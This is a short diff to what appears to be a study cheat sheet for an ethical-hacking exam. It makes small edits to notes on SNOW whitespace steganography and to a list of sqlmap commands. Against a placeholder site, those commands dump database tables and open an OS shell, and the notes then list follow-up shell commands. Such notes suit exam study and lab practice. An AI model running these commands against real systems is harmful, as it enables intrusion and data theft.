@@ -46,7 +46,7 @@ If even this the above command is not working then use this command-  namp -f 10
 ```
 #  Quick Overview (Stegnography) --> Snow , Openstego
 ```
-SNOW -C -m "<text>" -p "<pwd>" readme.txt readme2.txt   (1- Hide Data Using Whitespace Stegnography- pwd is password and your secret is stored in 														readme2.txt along with the content of readme.txt)
+SNOW -C -m "<text>" -p "<pwd>" readme.txt readme2.txt   (1- Hide Data Using Whitespace Stegnography- pwd is password and your secret is stored in 														 readme2.txt along with the content of readme.txt)
 SNOW -C -p "<pwd>" readme2.txt 							(To Display Hidden Data- then it will show the content of readme2.txt content)
 
 Image Stegnography using Openstego
@@ -101,7 +101,7 @@ Now you can do a RDP connection with the given ip and the Test account which you
    sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="<cookie>" --dbs
    sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="<cookie>" -D <databaseName> --tables
    sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="<cookie>" -D <databaseName> -T <tableName> --dump   
-6- For OS shell this is the command-   sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie]" --os-shell
+   sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie]" --os-shell
 6.1 In the shell type-   TASKLIST  (to view the tasks)
 6.2 Use systeminfo for windows to get all os version
 6.3 Use uname -a for linux to get os version
